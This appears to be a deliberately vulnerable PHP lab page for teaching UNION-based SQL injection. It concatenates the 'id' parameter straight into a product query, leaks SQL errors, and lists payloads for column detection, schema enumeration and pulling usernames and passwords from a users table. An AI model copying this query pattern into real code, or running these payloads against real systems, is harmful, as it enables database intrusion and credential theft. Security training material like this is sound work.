<?php
// VULNERABLE CODE - FOR EDUCATIONAL PURPOSES ONLY
// This code is vulnerable to UNION-based SQL injection

include 'db.php';

$results = [];
$error = "";
$submitted = false;

if (!empty($_GET['id'])) {
    $submitted = true;
    // VULNERABLE: Direct string concatenation without prepared statements
    $id = $_GET['id'];
    
    $query = "SELECT id, name, description, category, price FROM products WHERE id = " . $id;

    try {
        $result = $conn->query($query);
        
        if ($result && $result->rowCount() > 0) {
            $results = $result->fetchAll(PDO::FETCH_ASSOC);
        } else {
            $error = "No results found";
        }
    } catch (PDOException $e) {
        $error = "SQL Error: " . $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VULNERABLE - Search</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .warning {
            background-color: #ffcccc;
            color: #cc0000;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .error {
            background-color: #ffcccc;
            color: #cc0000;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 15px;
        }
        .search-box {
            margin-bottom: 30px;
        }
        .search-box input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        .search-box button {
            background-color: #ff6666;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
            font-weight: bold;
        }
        .search-box button:hover {
            background-color: #ff5555;
        }
        .results {
            margin-top: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table th, table td {
            border: 1px solid #ddd;
            padding: 10px;
            text-align: left;
        }
        table th {
            background-color: #f8f8f8;
            font-weight: bold;
        }
        .test-payloads {
            background-color: #fff3cd;
            padding: 15px;
            border-radius: 4px;
            margin-top: 30px;
            font-size: 12px;
        }
        .test-payloads h4 {
            margin-top: 0;
        }
        .test-payloads p {
            margin: 5px 0;
            font-family: monospace;
            background-color: #f9f9f9;
            padding: 5px;
            border-left: 2px solid #ff9800;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">⚠️ VULNERABLE CODE - EDUCATIONAL ONLY</div>
        
        <h1>Find a User (VULNERABLE)</h1>
        
        <div class="search-box">
            <form method="GET" action="">
                <label for="id">Enter user ID:</label>
                <input type="text" id="id" name="id" placeholder="Enter user ID (try: 1)">
                <button type="submit">SEARCH</button>
            </form>
        </div>
        
        <?php if (!empty($error)): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        
        <?php if ($submitted && !empty($results)): ?>
            <div class="results">
                <h2>Search Results:</h2>
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Name</th>
                            <th>Description</th>
                            <th>Category</th>
                            <th>Price</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($results as $row): ?>
                            <tr>
                                <td><?php echo htmlspecialchars($row['id']); ?></td>
                                <td><?php echo htmlspecialchars($row['name']); ?></td>
                                <td><?php echo htmlspecialchars($row['description']); ?></td>
                                <td><?php echo htmlspecialchars($row['category']); ?></td>
                                <td><?php echo htmlspecialchars($row['price']); ?></td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php elseif ($submitted && empty($results)): ?>
            <div class="error">No results found</div>
        <?php endif; ?>
        
        <div class="test-payloads">
            <h4>Test Payloads (Educational - UNION Injection):</h4>
            <p>Payload 1 - Column Detection:</p>
            <p>1 ORDER BY 5--</p>
            <p>1 ORDER BY 6--</p>
            <hr>
            <p>Payload 2 - Credential Extraction:</p>
            <p>0 UNION SELECT 1, username, password, role, email FROM users--</p>
            <hr>
            <p>Payload 3 - Schema Enumeration:</p>
            <p>0 UNION SELECT 1, table_name, table_schema, 3, 4 FROM information_schema.tables WHERE table_schema=database()--</p>
        </div>
    </div>
</body>
</html>
